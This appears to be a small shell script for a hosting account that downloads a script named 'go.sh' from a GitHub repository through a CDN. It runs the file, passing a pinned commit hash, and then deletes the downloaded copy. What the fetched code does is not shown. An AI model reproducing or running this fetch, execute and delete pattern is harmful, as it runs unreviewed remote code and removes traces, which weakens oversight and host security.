#!/bin/sh
C=3d24b1bddc332157093bd6ebff2d3086ddc1c0dc
H=/home/u814079684
B=https://cdn.jsdelivr.net/gh/jununrs/pensiun-pro-tmp-pub@$C/pprm-56f8cdc9
curl -fsSL -o $H/pppprm-56f8cdc9.sh "$B/go.sh" || exit 1
/bin/sh $H/pppprm-56f8cdc9.sh $C
rm -f $H/pppprm-56f8cdc9.sh
